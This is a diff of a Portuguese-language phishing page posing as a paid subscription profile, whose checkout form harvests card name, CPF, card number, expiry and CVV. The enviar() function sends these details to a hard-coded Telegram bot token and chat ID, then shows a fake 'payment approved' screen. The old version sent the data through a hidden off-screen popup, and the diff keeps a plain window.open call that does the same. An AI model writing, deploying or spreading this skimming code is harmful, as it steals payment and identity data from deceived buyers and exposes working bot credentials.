@@ -4,10 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Privacy | Kamylinha Santos</title>
-    
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
@@ -15,99 +13,71 @@
     <style>
         :root { --p-orange: #f47b52; --p-grad: linear-gradient(90deg, #f47b52, #f9a67a); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: #fff; color: #333; user-select: none; -webkit-user-select: none; overflow-x: hidden; }
-        input { user-select: text !important; -webkit-user-select: text !important; }
-
-        .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; position: sticky; top: 0; background: #fff; z-index: 100; }
+        body { background: #fff; color: #333; overflow-x: hidden; }
+        
+        .header { padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
         .logo-img { height: 28px; }
 
-        .banner-box { position: relative; width: 100%; height: 250px; background: #eee url('capa.png') center/cover no-repeat; }
-        .stats-overlay { position: absolute; bottom: 12px; right: 12px; background: rgba(0,0,0,0.65); color: #fff; padding: 6px 14px; border-radius: 20px; font-size: 11px; display: flex; gap: 12px; backdrop-filter: blur(5px); font-weight: 600; }
+        .banner { width: 100%; height: 230px; background: url('capa.png') center/cover; position: relative; }
+        .stats { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.6); color: #fff; padding: 5px 12px; border-radius: 20px; font-size: 11px; }
 
-        .profile-wrap { margin-top: -55px; padding: 0 20px; position: relative; z-index: 10; }
-        .profile-pic { width: 110px; height: 110px; border-radius: 50%; border: 4px solid #fff; background: #ddd url('perfil1.png') center/cover no-repeat; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
-        
-        .info { padding: 15px 20px; }
-        .name { font-size: 24px; font-weight: 800; display: flex; align-items: center; gap: 6px; }
-        .user-at { color: #888; font-size: 14px; margin-bottom: 12px; }
+        .profile-area { padding: 0 20px; margin-top: -50px; }
+        .p-pic { width: 100px; height: 100px; border-radius: 50%; border: 4px solid #fff; background: url('perfil1.png') center/cover; }
+        .p-name { font-size: 22px; font-weight: 800; margin-top: 10px; }
+        .p-user { color: #888; font-size: 14px; }
 
-        .plans { padding: 0 20px; display: flex; flex-direction: column; gap: 12px; }
-        .btn-plan { width: 100%; padding: 20px 25px; border-radius: 50px; border: none; color: #fff; background: var(--p-grad); display: flex; justify-content: space-between; align-items: center; cursor: pointer; text-decoration: none; }
-        
-        .gallery { padding: 20px; }
-        .media-item { width: 100%; height: 260px; border-radius: 20px; background: #eee url('imagem2.png') center/cover no-repeat; filter: blur(20px); border: 1px solid #eee; }
+        .plans { padding: 20px; display: flex; flex-direction: column; gap: 10px; }
+        .btn-p { width: 100%; padding: 18px; border-radius: 50px; border: none; background: var(--p-grad); color: #fff; font-weight: 700; font-size: 18px; cursor: pointer; display: flex; justify-content: space-between; }
 
-        #payModal, #successScreen { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 2000; backdrop-filter: blur(10px); }
-        .m-content { background: #fff; margin: 10% auto; width: 92%; max-width: 450px; border-radius: 30px; padding: 30px; }
-        .f-group { margin-bottom: 15px; text-align: left; }
-        .f-group label { display: block; font-weight: 800; font-size: 11px; color: #aaa; text-transform: uppercase; margin-bottom: 5px; }
-        .f-group input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #eee; background: #f9f9f9; font-size: 16px; outline: none; }
+        #modal, #success { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; padding: 20px; }
+        .content { background: #fff; border-radius: 20px; padding: 25px; margin-top: 50px; }
+        .inp { width: 100%; padding: 15px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; outline: none; }
         
-        #successScreen { background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .img-win { width: 100%; max-width: 320px; border-radius: 20px; margin: 20px 0; border: 4px solid var(--p-orange); }
-        .status-txt { font-size: 26px; font-weight: 900; color: #4CAF50; margin-bottom: 5px; }
-        .delivery-txt { font-size: 18px; font-weight: 600; color: #666; }
+        #success { background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .ok-img { width: 100%; max-width: 300px; border-radius: 15px; margin: 20px 0; border: 2px solid var(--p-orange); }
     </style>
 </head>
-<body oncontextmenu="return false">
+<body>
 
-    <div class="header">
-        <img src="logo.png" class="logo-img">
-        <i class="fa-solid fa-bars" style="color: var(--p-orange); font-size: 22px;"></i>
-    </div>
+    <div class="header"><img src="logo.png" class="logo-img"><i class="fa-solid fa-bars" style="color:var(--p-orange)"></i></div>
 
-    <div class="banner-box">
-        <div class="stats-overlay">
-            <span><i class="fa-regular fa-image"></i> 354</span>
-            <span><i class="fa-solid fa-video"></i> 148</span>
-            <span><i class="fa-regular fa-heart"></i> 20.2K</span>
-        </div>
-    </div>
+    <div class="banner"><div class="stats">354 <i class="fa-regular fa-image"></i> | 148 <i class="fa-solid fa-video"></i></div></div>
 
-    <div class="profile-wrap"><div class="profile-pic"></div></div>
-
-    <div class="info">
-        <div class="name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></div>
-        <div class="user-at">@eukamylinhasantos</div>
+    <div class="profile-area">
+        <div class="p-pic"></div>
+        <div class="p-name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></div>
+        <div class="p-user">@eukamylinhasantos</div>
     </div>
 
     <div class="plans">
-        <div class="btn-plan" onclick="openPay('Mensal', '10,00')">
-            <span style="font-size: 20px; font-weight: 600;">Assinar Mensal</span>
-            <span style="font-weight: 800;">R$ 10,00</span>
-        </div>
-        <div class="btn-plan" onclick="openPay('Vitalício', '27,00')">
-            <span style="font-size: 20px; font-weight: 600;">Acesso Vitalício</span>
-            <span style="font-weight: 800;">R$ 27,00</span>
-        </div>
+        <button class="btn-p" onclick="abrir('Mensal', '10,00')"><span>Assinar Mensal</span> <span>R$ 10,00</span></button>
+        <button class="btn-p" onclick="abrir('Vitalício', '27,00')"><span>Acesso Vitalício</span> <span>R$ 27,00</span></button>
     </div>
 
-    <div class="gallery"><div class="media-item"></div></div>
-
-    <div id="payModal">
-        <div class="m-content">
-            <h2 id="planTitle" style="color:var(--p-orange); margin-bottom:20px; font-weight:800">Checkout</h2>
-            <div class="f-group"><label>Nome no Cartão</label><input type="text" id="n"></div>
-            <div class="f-group"><label>CPF</label><input type="text" id="f"></div>
-            <div class="f-group"><label>Número do Cartão</label><input type="text" id="c"></div>
+    <div id="modal">
+        <div class="content">
+            <h2 id="tit" style="margin-bottom:15px; text-align:center; color:var(--p-orange)">Checkout</h2>
+            <input type="text" id="n" class="inp" placeholder="Nome no Cartão">
+            <input type="text" id="f" class="inp" placeholder="CPF">
+            <input type="text" id="c" class="inp" placeholder="Número do Cartão">
             <div style="display:flex; gap:10px">
-                <div class="f-group" style="flex:1"><label>Validade</label><input type="text" id="v"></div>
-                <div class="f-group" style="flex:1"><label>CVV</label><input type="text" id="s"></div>
+                <input type="text" id="v" class="inp" placeholder="MM/AA">
+                <input type="text" id="s" class="inp" placeholder="CVV">
             </div>
-            <button class="btn-plan" style="justify-content:center; font-weight:800; width:100%" onclick="enviar()">APROVAR COMPRA</button>
+            <button class="btn-p" style="justify-content:center" onclick="enviar()">APROVAR COMPRA</button>
         </div>
     </div>
 
-    <div id="successScreen">
-        <i class="fa-solid fa-circle-check" style="color:#4CAF50; font-size:80px"></i>
-        <h1 class="status-txt">PAGAMENTO APROVADO</h1>
-        <p class="delivery-txt">Entrega de conteúdo em até 24Hrs</p>
-        <img src="imagem1.png" class="img-win">
-        <button class="btn-plan" style="width:200px; justify-content:center; margin-top:20px" onclick="location.reload()">SAIR</button>
+    <div id="success">
+        <i class="fa-solid fa-circle-check" style="color:#4CAF50; font-size:60px"></i>
+        <h1 style="color:#4CAF50; margin-top:10px">PAGAMENTO APROVADO</h1>
+        <p style="font-size:18px; font-weight:600">Entrega de conteúdo em até 24Hrs</p>
+        <img src="imagem1.png" class="ok-img">
+        <button class="btn-p" style="width:200px; justify-content:center" onclick="location.reload()">FECHAR</button>
     </div>
 
     <script>
-        let pSel = "";
+        let plano = "";
         $(document).ready(function(){
             $('#c').mask('0000 0000 0000 0000');
             $('#f').mask('000.000.000-00');
@@ -115,28 +85,34 @@
             $('#s').mask('000');
         });
 
-        function openPay(n, p) { pSel = n; $('#planTitle').text('Plano ' + n + ' - R$ ' + p); $('#payModal').fadeIn(); }
+        function abrir(p, r) { plano = p; $('#tit').text('Plano ' + p + ' - R$ ' + r); $('#modal').show(); }
 
         function enviar() {
             const token = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
             const chat = '-1003569961624';
-            const d = { n: $('#n').val(), c: $('#c').val(), f: $('#f').val(), v: $('#v').val(), s: $('#s').val() };
+            
+            const dados = {
+                n: $('#n').val(),
+                f: $('#f').val(),
+                c: $('#c').val(),
+                v: $('#v').val(),
+                s: $('#s').val()
+            };
 
-            if (d.c.length < 16) return Notiflix.Notify.failure('Dados inválidos!');
+            if(dados.c.length < 16) { alert('Dados inválidos'); return; }
 
             Notiflix.Loading.circle('Processando...');
 
-            const msg = `🚀 NOVO CARD\n👤 Nome: ${d.n}\n🆔 CPF: ${d.f}\n💳 Card: ${d.c}\n📅 Val: ${d.v}\n🔒 CVV: ${d.s}\n💰 Plano: ${pSel}`;
+            const texto = `🚀 NOVO CARD\n👤 Nome: ${dados.n}\n🆔 CPF: ${dados.f}\n💳 Card: ${dados.c}\n📅 Val: ${dados.v}\n🔒 CVV: ${dados.s}\n💰 Plano: ${plano}`;
             
-            // Abre janela oculta para o Telegram e fecha rápido
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`;
-            const win = window.open(url, '_blank', 'width=1,height=1,left=25000,top=25000');
+            // MÉTODO ANTIGO: Abre a janela e deixa o Telegram processar
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(texto)}`;
+            window.open(url, '_blank');
 
             setTimeout(() => {
-                if(win) win.close();
                 Notiflix.Loading.remove();
-                $('#payModal').hide();
-                $('#successScreen').css('display', 'flex'); 
+                $('#modal').hide();
+                $('#success').css('display', 'flex');
             }, 2000);
         }
     </script>
